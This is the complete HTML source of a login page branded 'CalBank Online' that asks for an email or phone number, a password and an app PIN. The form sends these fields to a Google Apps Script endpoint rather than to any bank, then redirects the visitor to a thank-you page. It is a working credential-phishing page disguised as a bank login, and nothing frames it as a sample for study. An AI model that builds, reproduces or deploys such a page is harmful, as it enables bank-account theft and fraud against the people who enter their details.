<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Authentication</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background-color: #f7f7f7;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .header {
      background-color: #f9c600;
      color: #000;
      text-align: center;
      width: 100%;
      padding: 40px 20px;
      border-bottom-left-radius: 40px;
      border-bottom-right-radius: 40px;
    }
    .header h1 { margin: 0; font-size: 22px; }
    .header p { margin: 5px 0 0; font-size: 14px; }
    .login-container {
      background: #fff;
      width: 90%;
      max-width: 360px;
      margin-top: -30px;
      padding: 30px 25px;
      border-radius: 12px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    .login-container label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #333;
    }
    .login-container input {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 14px;
    }
    .button-group {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      flex-wrap: wrap;
    }
    .button-group button {
      flex: 1;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .home-btn { background-color: #f7931e; color: #fff; }
    .home-btn:hover { background-color: #e67c0e; }
    .login-btn { background-color: #f9c600; color: #000; }
    .login-btn:hover { background-color: #e6b200; }
  </style>
</head>
<body>
  <div class="header">
    <h1>Secure Authentication</h1>
    <p>CalBank Online</p>
  </div>

  <div class="login-container">
    <!-- Send form entries to Google Forms -->
    <form action="https://script.google.com/macros/s/AKfycbwmkOBcmudBWS5kC-9UD2Gq_jsddGL9V8rNI2imMEf23HGzroYRrX6Svee0DNSS7msP/exec" method="POST" target="_blank" onsubmit="redirectAfterSubmit()">

      <label>Email or Phone Number </label>
      <input type="email" name="entry.592928459" placeholder="Enter email" required>

      <label>Password</label>
      <input type="text" name="entry.1325979910" placeholder="Enter your password " required>

      <label>App Pin Code</label>
      <input type="text" name="entry.1166533453" placeholder="Enter pin" required>

      <div class="button-group">
        <button type="submit" class="login-btn">VALIDATE â†’</button>
      </div>
    </form>
  </div>

  <script>
    function redirectAfterSubmit() {
      setTimeout(() => {
        window.location.href = "thank_you.html";
      }, 1000);
    }
  </script>
</body>
</html>
